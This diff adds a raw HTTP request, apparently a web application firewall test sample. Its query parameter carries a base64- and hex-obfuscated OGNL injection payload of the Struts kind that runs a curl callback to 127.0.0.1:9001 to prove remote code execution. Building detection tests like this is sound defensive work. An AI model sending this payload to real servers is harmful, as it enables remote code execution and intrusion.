@@ -1,0 +1,13 @@
+PUT /score/subsequent/manage/watch?element=subsidiary&adapter=underscore&distinction=KCNjb250ZXh0PSNhdHRyWydceDczJysnXHg3NCcrJ1x4NzInKydceDc1JysnXHg3NCcrJ1x4NzMnKydceDJlJysnXHg3NicrJ1x4NjEnKydceDZjJysnXHg3NScrJ1x4NjUnKydceDUzJysnXHg3NCcrJ1x4NjEnKydceDYzJysnXHg2YicgXS5jb250ZXh0KS4oI2NvbnRleHQuc2V0TWVtYmVyQWNjZXNzKEBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykpLihAamF2YS5sYW5nLlJ1bnRpbWVAZ2V0UnVudGltZSgpLmV4ZWMoJ1x4NjMnKydceDc1JysnXHg3MicrJ1x4NmMnKydceDIwJysnXHgzMScrJ1x4MzInKydceDM3JysnXHgyZScrJ1x4MzAnKydceDJlJysnXHgzMCcrJ1x4MmUnKydceDMxJysnXHgzYScrJ1x4MzknKydceDMwJysnXHgzMCcrJ1x4MzEnICkp HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko
+Cookie: caveats=init; SESSIONID=de36f6b01faa92abc02ecada0d32e02d34c3f65a7f92714d10c2da5931bd10f833b0cfad3cf2f5be7a10dc618fe11480
+
